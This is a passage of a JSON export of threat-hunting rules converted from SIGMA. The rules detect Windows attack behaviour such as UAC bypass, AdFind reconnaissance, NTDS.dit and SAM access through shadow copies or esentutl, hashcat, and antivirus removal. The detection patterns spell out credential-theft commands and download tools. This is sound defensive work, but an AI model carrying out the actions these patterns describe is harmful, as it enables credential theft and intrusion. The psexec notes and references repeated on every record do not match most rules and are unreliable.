            "name": "Delete All Scheduled Tasks",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \" /delete \" and tgt.process.cmdline contains \"/tn \\*\" and tgt.process.cmdline contains \" /f\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 939
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects PowerShell script execution from Alternate Data Stream (ADS)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Run PowerShell Script from ADS",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and (tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \"Get-Content\" and tgt.process.cmdline contains \"-Stream\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 940
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid Image based detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Use NTFS Short Name in Image",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"~1.bat\" or tgt.process.image.path contains \"~1.dll\" or tgt.process.image.path contains \"~1.exe\" or tgt.process.image.path contains \"~1.hta\" or tgt.process.image.path contains \"~1.js\" or tgt.process.image.path contains \"~1.msi\" or tgt.process.image.path contains \"~1.ps1\" or tgt.process.image.path contains \"~1.tmp\" or tgt.process.image.path contains \"~1.vbe\" or tgt.process.image.path contains \"~1.vbs\" or tgt.process.image.path contains \"~2.bat\" or tgt.process.image.path contains \"~2.dll\" or tgt.process.image.path contains \"~2.exe\" or tgt.process.image.path contains \"~2.hta\" or tgt.process.image.path contains \"~2.js\" or tgt.process.image.path contains \"~2.msi\" or tgt.process.image.path contains \"~2.ps1\" or tgt.process.image.path contains \"~2.tmp\" or tgt.process.image.path contains \"~2.vbe\" or tgt.process.image.path contains \"~2.vbs\") and (not src.process.image.path=\"C:\\Windows\\explorer.exe\") and (not (src.process.image.path contains \"\\WebEx\\WebexHost.exe\" or src.process.image.path contains \"\\thor\\thor64.exe\" or tgt.process.image.path=\"C:\\PROGRA~1\\WinZip\\WZPREL~1.EXE\" or tgt.process.image.path contains \"\\VCREDI~1.EXE\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 941
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects AdFind execution with common flags seen used during attacks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1018",
                "t1087",
                "t1482",
                "t1069"
            ],
            "name": "PUA - AdFind Suspicious Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"domainlist\" or tgt.process.cmdline contains \"trustdmp\" or tgt.process.cmdline contains \"dcmodes\" or tgt.process.cmdline contains \"adinfo\" or tgt.process.cmdline contains \" dclist \" or tgt.process.cmdline contains \"computer_pwdnotreqd\" or tgt.process.cmdline contains \"objectcategory=\" or tgt.process.cmdline contains \"-subnets -f\" or tgt.process.cmdline contains \"name=\\\"Domain Admins\\\"\" or tgt.process.cmdline contains \"-sc u:\" or tgt.process.cmdline contains \"domainncs\" or tgt.process.cmdline contains \"dompol\" or tgt.process.cmdline contains \" oudmp \" or tgt.process.cmdline contains \"subnetdmp\" or tgt.process.cmdline contains \"gpodmp\" or tgt.process.cmdline contains \"fspdmp\" or tgt.process.cmdline contains \"users_noexpire\" or tgt.process.cmdline contains \"computers_active\" or tgt.process.cmdline contains \"computers_pwdnotreqd\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 942
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the \"IDiagnosticProfileUAC\" UAC bypass technique",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using IDiagnostic Profile",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\DllHost.exe\" and src.process.cmdline contains \" /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 943
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003",
                "t1003"
            ],
            "name": "Esentutl Gather Credentials",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"esentutl\" and tgt.process.cmdline contains \" /p\")) | columns tgt.process.user,tgt.process.cmdline,src.process.cmdline,tgt.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 944
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1566"
            ],
            "name": "Suspicious Double Extension File Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \".doc.exe\" or tgt.process.image.path contains \".docx.exe\" or tgt.process.image.path contains \".xls.exe\" or tgt.process.image.path contains \".xlsx.exe\" or tgt.process.image.path contains \".ppt.exe\" or tgt.process.image.path contains \".pptx.exe\" or tgt.process.image.path contains \".rtf.exe\" or tgt.process.image.path contains \".pdf.exe\" or tgt.process.image.path contains \".txt.exe\" or tgt.process.image.path contains \"      .exe\" or tgt.process.image.path contains \"______.exe\" or tgt.process.image.path contains \".doc.js\" or tgt.process.image.path contains \".docx.js\" or tgt.process.image.path contains \".xls.js\" or tgt.process.image.path contains \".xlsx.js\" or tgt.process.image.path contains \".ppt.js\" or tgt.process.image.path contains \".pptx.js\" or tgt.process.image.path contains \".rtf.js\" or tgt.process.image.path contains \".pdf.js\" or tgt.process.image.path contains \".txt.js\") and (tgt.process.cmdline contains \".doc.exe\" or tgt.process.cmdline contains \".docx.exe\" or tgt.process.cmdline contains \".xls.exe\" or tgt.process.cmdline contains \".xlsx.exe\" or tgt.process.cmdline contains \".ppt.exe\" or tgt.process.cmdline contains \".pptx.exe\" or tgt.process.cmdline contains \".rtf.exe\" or tgt.process.cmdline contains \".pdf.exe\" or tgt.process.cmdline contains \".txt.exe\" or tgt.process.cmdline contains \"      .exe\" or tgt.process.cmdline contains \"______.exe\" or tgt.process.cmdline contains \".doc.js\" or tgt.process.cmdline contains \".docx.js\" or tgt.process.cmdline contains \".xls.js\" or tgt.process.cmdline contains \".xlsx.js\" or tgt.process.cmdline contains \".ppt.js\" or tgt.process.cmdline contains \".pptx.js\" or tgt.process.cmdline contains \".rtf.js\" or tgt.process.cmdline contains \".pdf.js\" or tgt.process.cmdline contains \".txt.js\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 945
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a command that accesses the VolumeShadowCopy in order to extract sensitive files such as the Security or SAM registry hives or the AD database (ntds.dit)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1490"
            ],
            "name": "Sensitive File Access Via Volume Shadow Copy Backup",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\" and (tgt.process.cmdline contains \"\\NTDS.dit\" or tgt.process.cmdline contains \"\\SYSTEM\" or tgt.process.cmdline contains \"\\SECURITY\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 946
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of DeviceCredentialDeployment to hide a process from view",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "DeviceCredentialDeployment Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\DeviceCredentialDeployment.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 947
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the addition of a new LogonScript to the registry value \"UserInitMprLogonScript\" for potential persistence",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1037"
            ],
            "name": "Potential Persistence Via Logon Scripts - CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"UserInitMprLogonScript\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 948
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of the \"Manage Engine ServiceDesk Plus\" Java web service",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1102"
            ],
            "name": "Suspicious Child Process Of Manage Engine ServiceDesk",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\ManageEngine\\ServiceDesk\\\" and src.process.image.path contains \"\\java.exe\") and (tgt.process.image.path contains \"\\AppVLP.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\curl.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\mftrace.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\query.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\scrcons.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\")) and (not ((tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\") and tgt.process.cmdline contains \" stop\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 949
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1110"
            ],
            "name": "HackTool - Hashcat Password Cracker Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\hashcat.exe\" or (tgt.process.cmdline contains \"-a \" and tgt.process.cmdline contains \"-m 1000 \" and tgt.process.cmdline contains \"-r \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 950
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1204"
            ],
            "name": "Potential Suspicious Browser Launch From Document Reader Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"Acrobat Reader\" or src.process.image.path contains \"Microsoft Office\" or src.process.image.path contains \"PDF Reader\") and (tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\firefox.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\maxthon.exe\" or tgt.process.image.path contains \"\\seamonkey.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\" or tgt.process.image.path contains \"\") and tgt.process.cmdline contains \"http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 951
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential evasion or obfuscation attempts using bogus path traversal via the commandline",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Potential Command Line Path Traversal Evasion Attempt",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\Windows\\\" and (tgt.process.cmdline contains \"\\..\\Windows\\\" or tgt.process.cmdline contains \"\\..\\System32\\\" or tgt.process.cmdline contains \"\\..\\..\\\")) or tgt.process.cmdline contains \".exe\\..\\\") and (not (tgt.process.cmdline contains \"\\Google\\Drive\\googledrivesync.exe\\..\\\" or tgt.process.cmdline contains \"\\Citrix\\Virtual Smart Card\\Citrix.Authentication.VirtualSmartcard.Launcher.exe\\..\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 952
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of CleanWipe a tool usually used to delete Symantec antivirus.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "PUA - CleanWipe Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\SepRemovalToolNative_x64.exe\" or (tgt.process.image.path contains \"\\CATClean.exe\" and tgt.process.cmdline contains \"--uninstall\") or (tgt.process.image.path contains \"\\NetInstaller.exe\" and tgt.process.cmdline contains \"-r\") or (tgt.process.image.path contains \"\\WFPUnins.exe\" and (tgt.process.cmdline contains \"/uninstall\" and tgt.process.cmdline contains \"/enterprise\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 953
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a potential command line flag anomaly related to \"regsvr32\" in which the \"/i\" flag is used without the \"/n\" which should be uncommon.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potential Regsvr32 Commandline Flag Anomaly",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
